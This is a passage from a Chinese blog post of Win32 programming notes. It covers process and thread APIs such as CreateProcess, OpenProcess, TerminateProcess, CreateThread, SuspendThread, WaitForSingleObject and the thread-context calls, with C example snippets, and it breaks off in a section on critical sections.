title="句柄是否”允许”被继承"></a>句柄是否”允许”被继承</h2><p>上面是说是否可以被继承，真正继承要另一个参数，还是CreateProcess举例，是<code>bInheritHandles</code>这个参数，这个参数决定了是否允许创建的子进程继承句柄，设置为TRUE时，我们创建的子进程才允许继承父进程的句柄。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401234807835.png" alt="image-20220401234807835"></p><h1 id="进程相关API"><a href="#进程相关API" class="headerlink" title="进程相关API"></a>进程相关API</h1><p>CreateProcess函数会给我们返回一个结构体，包含四个数据：进程编号（ID）、进程句柄、线程编号（ID）、线程句柄。</p><p>进程ID，通常我们称之为PID，任务管理器中的就是。</p><h2 id="全局句柄表"><a href="#全局句柄表" class="headerlink" title="全局句柄表"></a>全局句柄表</h2><p>每个进程都有一份私有的句柄表，而操作系统也有一份句柄表，我们称之为全局句柄表，这张表里包含了所有正在运行的进程、线程</p><p>PID我们就可以理解为是全局句柄表中的一个索引，那么PID和句柄的区别就很容易看出来来了，<strong>PID是全局的，在任何进程中都有意义，都可以使用，而句柄则是局部的、私有的</strong>；PID是<strong>唯一的，绝对不可能出现重复的存在</strong>，但是当进程消失，那么这个PID就有可能会分给另外一个进程。（<strong>PID不是句柄，但是可以通过PID获得到全局句柄表中其对应的句柄</strong>）</p><p>A程序打开IE，获取PID和句柄：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR childProcessName[] = TEXT(<span class="string">&quot;C:\\Program Files\\Internet Explorer\\iexplore.exe&quot;</span>);</span><br><span class="line">    TCHAR childPeocessCmd[] = TEXT(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">    <span class="keyword">if</span> (CreateProcess(childProcessName,</span><br><span class="line">                      childPeocessCmd,</span><br><span class="line">                      <span class="literal">NULL</span>,</span><br><span class="line">                      <span class="literal">NULL</span>,</span><br><span class="line">                      FALSE,</span><br><span class="line">                      <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;create success\nPID:%d, 句柄:%d&quot;</span>, pi.dwProcessId, pi.hProcess);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateProcess Error: %d \n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后B使用TerminateProcess函数来终止A进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TerminateProcess函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">TerminateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hProcess, <span class="comment">// handle to the process 句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  UINT uExitCode   <span class="comment">// exit code for the process 退出代码</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    hProcess = (HANDLE)<span class="number">0x1b0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!TerminateProcess(hProcess, <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;终止失败,%d\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见是失败，6，句柄无效，真正的关闭这个进程，那就需要借助PID来获取句柄：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwDesiredAccess,  <span class="comment">// access flag 你希望的访问权限,https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bInheritHandle,    <span class="comment">// handle inheritance option 是否可以被继承</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwProcessId       <span class="comment">// process identifier 进程ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <span class="number">0x4598</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!TerminateProcess(hProcess, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;终止进程失败：%d \n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后发现iE关了。</p><h2 id="以挂起的形式创建进程"><a href="#以挂起的形式创建进程" class="headerlink" title="以挂起的形式创建进程"></a>以挂起的形式创建进程</h2><p>还是CreateProcess，第六个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpApplicationName,                 <span class="comment">// name of executable module</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpCommandLine,                      <span class="comment">// command line string</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpThreadAttributes,  <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bInheritHandles,                      <span class="comment">// handle inheritance option</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwCreationFlags,                     <span class="comment">// creation flags &lt;--这个参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpEnvironment,                      <span class="comment">// new environment block</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpCurrentDirectory,                <span class="comment">// current directory name</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSTARTUPINFO lpStartupInfo,               <span class="comment">// startup information</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// process information</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    TCHAR childProcessName[] = TEXT(<span class="string">&quot;C:/WINDOWS/system32/cmd.exe&quot;</span>);</span><br><span class="line">    TCHAR childPeocessCmd[] = TEXT(<span class="string">&quot;/c ping www.baidu.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">(CreateProcess(childProcessName,childPeocessCmd,  <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写<code>CREATE_NEW_CONSOLE</code>就会在新的终端打开，不然就是本终端打开。</p><p>但是我们关注的是另一个，有意义的，<code>CREATE_SUSPENDED</code></p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image2021-5-22_1-12-9.png"></p><p>释放使用resumeThread</p><h2 id="模块目录和工作目录"><a href="#模块目录和工作目录" class="headerlink" title="模块目录和工作目录"></a>模块目录和工作目录</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> strModule[<span class="number">256</span>];</span><br><span class="line">    GetModuleFileName(<span class="literal">NULL</span>,(LPWSTR)strModule, <span class="number">256</span>);<span class="comment">// 得到当前模块目录，当前exe所在的路径，包含exe文件名</span></span><br><span class="line">    <span class="keyword">char</span> strWork[<span class="number">1000</span>];</span><br><span class="line">    GetCurrentDirectory(<span class="number">1000</span>, (LPWSTR)strWork); <span class="comment">// 获取当前工作目录</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;模块目录：%ws \n工作目录：%ws \n&quot;</span>, strModule, strWork);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其他进程相关API"><a href="#其他进程相关API" class="headerlink" title="其他进程相关API"></a>其他进程相关API</h2><p>获取当前进程ID（PID）：GetCurrentProcessId</p><p>获取当前进程句柄：GetCurrentProcess</p><p>获取命令行：GetCommandLine</p><p>获取启动信息：GetStartupInfo</p><p>遍历进程ID：EnumProcesses</p><p>快照：CreateToolhelp32Snapshot</p><h1 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h1><p>线程：附属在进程上的执行实体，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">( <span class="comment">// 返回值是线程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// SD 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T dwStackSize,                       <span class="comment">// initial stack size 初始堆栈</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTHREAD_START_ROUTINE lpStartAddress,    <span class="comment">// thread function 线程执行的函数代码</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpParameter,                       <span class="comment">// thread argument 线程需要的参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwCreationFlags,                    <span class="comment">// creation option 标识，也可以以挂起形式创建线程</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpThreadId                        <span class="comment">// thread identifier 返回当前线程ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 线程执行的函数有语法要求，参考MSDN Library</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        Sleep(<span class="number">500</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;++++++ %d \n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hd;</span><br><span class="line">    <span class="comment">// 创建线程</span></span><br><span class="line">    hd=CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    CloseHandle(hd);</span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        Sleep(<span class="number">500</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;------ %d \n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">    <span class="keyword">int</span>* p = (<span class="keyword">int</span>*)lpParameter;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; *p; i++) &#123;</span><br><span class="line">....................</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">.............</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">10</span>;</span><br><span class="line">    <span class="comment">// 创建线程</span></span><br><span class="line">    hd=CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, &amp;n, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    CloseHandle(hd);</span><br><span class="line">..........</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="线程控制"><a href="#线程控制" class="headerlink" title="线程控制"></a>线程控制</h1><h2 id="停止线程"><a href="#停止线程" class="headerlink" title="停止线程"></a>停止线程</h2><p>停止自己的线程，可以使用sleep函数，上面有。</p><p>下面是停止别的线程：</p><h2 id="SuspendThread"><a href="#SuspendThread" class="headerlink" title="SuspendThread"></a>SuspendThread</h2><p>SuspendThread函数用于暂停（挂起）某个线程，当暂停后该线程不会占用CPU，只需要传入一个线程句柄：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">SuspendThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread   <span class="comment">// handle to thread</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hd;</span><br><span class="line">hd = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">Sleep(<span class="number">3000</span>);</span><br><span class="line">SuspendThread(hd);</span><br><span class="line">Sleep(<span class="number">3000</span>);</span><br><span class="line">ResumeThread(hd);</span><br><span class="line">CloseHandle(hd);</span><br></pre></td></tr></table></figure><h2 id="等待线程结束"><a href="#等待线程结束" class="headerlink" title="等待线程结束"></a>等待线程结束</h2><h3 id="WaitForSingleObject"><a href="#WaitForSingleObject" class="headerlink" title="WaitForSingleObject"></a>WaitForSingleObject</h3><p>WaitForSingleObject函数用于等待<strong>一个内核对象</strong>状态发生变更</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hHandle,       </span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwMilliseconds   <span class="comment">// time-out interval 等待超时时间（毫秒）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>INFINITE</code>表示，不指定超时时间，要执行完才继续走</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hd;</span><br><span class="line">hd=CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   </span><br><span class="line">WaitForSingleObject(hd, INFINITE);</span><br><span class="line">SuspendThread(hd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="WaitForMultipleObjects"><a href="#WaitForMultipleObjects" class="headerlink" title="WaitForMultipleObjects"></a>WaitForMultipleObjects</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForMultipleObjects</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD nCount,             <span class="comment">// number of handles in array 内核对象的数量</span></span></span></span><br><span class="line"><span class="params"><span class="function">  CONST HANDLE *lpHandles,  <span class="comment">// object-handle array 内核对象的句柄数组</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bWaitAll,            <span class="comment">// wait option 等待模式</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwMilliseconds      <span class="comment">// time-out interval 等待超时时间（毫秒）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hd[<span class="number">2</span>];</span><br><span class="line">hd[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">hd[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">WaitForMultipleObjects(<span class="number">2</span>, hd,<span class="literal">true</span>, INFINITE);</span><br><span class="line">SuspendThread(hd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="GetExitCodeThread"><a href="#GetExitCodeThread" class="headerlink" title="GetExitCodeThread"></a>GetExitCodeThread</h3><p>和名字一样，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetExitCodeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread,      <span class="comment">// handle to the thread</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpExitCode   <span class="comment">// termination status</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="获取设置线程上下文"><a href="#获取设置线程上下文" class="headerlink" title="获取设置线程上下文"></a>获取设置线程上下文</h2><h2 id="GetThreadContext"><a href="#GetThreadContext" class="headerlink" title="GetThreadContext"></a>GetThreadContext</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetThreadContext</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread,       <span class="comment">// handle to thread with context 句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCONTEXT lpContext   <span class="comment">// context structure</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> HANDLE hd[<span class="number">2</span>];</span><br><span class="line"> hd[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* hd[1] = CreateThread(NULL, NULL, ThreadProc1, NULL, 0, NULL);*/</span></span><br><span class="line"></span><br><span class="line"> SuspendThread(hd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"> CONTEXT context;</span><br><span class="line"> context.ContextFlags = CONTEXT_INTEGER;</span><br><span class="line"> GetThreadContext(hd[<span class="number">0</span>], &amp;context);</span><br><span class="line"></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;end\n%d ,%d&quot;</span>,context.Rax,context.Rbx);</span><br><span class="line"> ResumeThread(hd[<span class="number">0</span>]);</span><br><span class="line"> CloseHandle(hd[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><h3 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h3><p>修改线程上下文</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetThreadContext</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread,            <span class="comment">// handle to thread</span></span></span></span><br><span class="line"><span class="params"><span class="function">  CONST CONTEXT *lpContext   <span class="comment">// context structure</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CONTEXT context;</span><br><span class="line">context.ContextFlags = CONTEXT_INTEGER;</span><br><span class="line">context.Eax = <span class="number">0x123</span>;</span><br><span class="line">SetThreadContext(hd[<span class="number">0</span>], &amp;context);</span><br><span class="line"></span><br><span class="line">CONTEXT c;</span><br><span class="line">c.ContextFlags = CONTEXT_INTEGER;</span><br><span class="line">GetThreadContext(hd[<span class="number">0</span>], &amp;c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x ,%x&quot;</span>, c.Eax, c.Ebp);</span><br><span class="line">getchar();</span><br><span class="line">ResumeThread(hd[<span class="number">0</span>]);</span><br><span class="line">CloseHandle(hd[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><h1 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h1><p>每个线程都有自己的栈，局部变量是存储在栈中的，这就意味着每个进程都会有一份自己的“句柄变量”（栈），如果线程仅仅使用自己的“局部变量”那就不存在线程安全问题，反之，如果多个线程共用一个全局变量，且修改该全局变量就会出现问题。</p><p>临界资源：一次只有一个线程使用</p><p>临界区：访问临界资源的代码</p><h2 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h2><p>使用线程锁来解决上面的问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建全局变量：CRITICAL_SECTION cs;</span><br><span 